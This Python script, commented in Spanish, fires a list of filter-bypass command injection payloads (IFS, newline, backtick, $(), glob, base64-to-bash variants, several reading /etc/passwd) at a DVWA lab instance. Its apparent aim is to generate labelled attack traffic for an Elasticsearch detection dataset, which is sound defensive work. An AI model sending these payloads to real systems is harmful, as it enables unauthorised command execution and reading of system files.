import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS COMMAND INJECTION ENTRENAMIENTO HIGH
# En nivel high DVWA usa lista blanca de IPs.
# Solo acepta IPs validas como 127.0.0.1.
# Se usan tecnicas de bypass avanzadas.
# DISTINTOS a low y medium.
# =============================================

PAYLOADS_EXEC_HIGH = [
    # Bypass con IFS (Internal Field Separator)
    "127.0.0.1${IFS}ls",
    "127.0.0.1${IFS}whoami",
    "127.0.0.1${IFS}id",
    "127.0.0.1${IFS}pwd",
    "127.0.0.1${IFS}cat${IFS}/etc/passwd",
    "127.0.0.1${IFS}uname${IFS}-a",
    # Bypass con tabulacion
    "127.0.0.1\tls",
    "127.0.0.1\twhoami",
    "127.0.0.1\tid",
    # Bypass con nueva linea
    "127.0.0.1%0als",
    "127.0.0.1%0awhoami",
    "127.0.0.1%0aid",
    "127.0.0.1%0acat%20/etc/passwd",
    "127.0.0.1%0d%0als",
    # Bypass con backticks
    "127.0.0.1`ls`",
    "127.0.0.1`whoami`",
    "127.0.0.1`id`",
    "127.0.0.1`cat /etc/passwd`",
    # Bypass con $()
    "127.0.0.1$(ls)",
    "127.0.0.1$(whoami)",
    "127.0.0.1$(id)",
    "127.0.0.1$(cat /etc/passwd)",
    "127.0.0.1$(uname -a)",
    # Bypass con codificacion
    "127.0.0.1%3Bls",
    "127.0.0.1%3Bwhoami",
    "127.0.0.1%7Cls",
    "127.0.0.1%7Cwhoami",
    "127.0.0.1%26%26ls",
    "127.0.0.1%26%26whoami",
    # Bypass con variables de entorno
    "127.0.0.1;${PATH:0:1}bin${PATH:0:1}ls",
    "127.0.0.1;$HOME",
    "127.0.0.1;echo $PATH",
    "127.0.0.1;echo $HOME",
    "127.0.0.1;echo $USER",
    "127.0.0.1;echo $SHELL",
    # Bypass con glob
    "127.0.0.1;/???/ls",
    "127.0.0.1;/???/whoami",
    "127.0.0.1;/???/cat /etc/passwd",
    "127.0.0.1;/bin/l?",
    "127.0.0.1;/usr/bin/id",
    # Bypass con concatenacion de strings
    "127.0.0.1;l''s",
    "127.0.0.1;w'h'o'a'm'i",
    "127.0.0.1;ca''t /etc/passwd",
    # Bypass con here-string
    "127.0.0.1;bash<<<ls",
    "127.0.0.1;bash<<<whoami",
    # Tecnicas de evasion avanzadas
    "127.0.0.1;{ls,-la}",
    "127.0.0.1;{whoami,}",
    "127.0.0.1;printf '%s' l s | bash",
    "127.0.0.1;echo 'bHM=' | base64 -d | bash",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_exec_high(session):
    print("\n[*] Iniciando ataques Command Injection HIGH...")
    payloads = PAYLOADS_EXEC_HIGH.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.post(f"{BASE_URL}/vulnerabilities/exec/",
                             data={"ip": payload, "Submit": "Submit"})
            print(f"  EXEC_H | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Command Injection High completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: COMMAND INJECTION — NIVEL HIGH")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'exec'")
    print("  AVISO: Asegurate de que DVWA esta en nivel HIGH")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_exec_high(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'exec'")
    print("="*60)
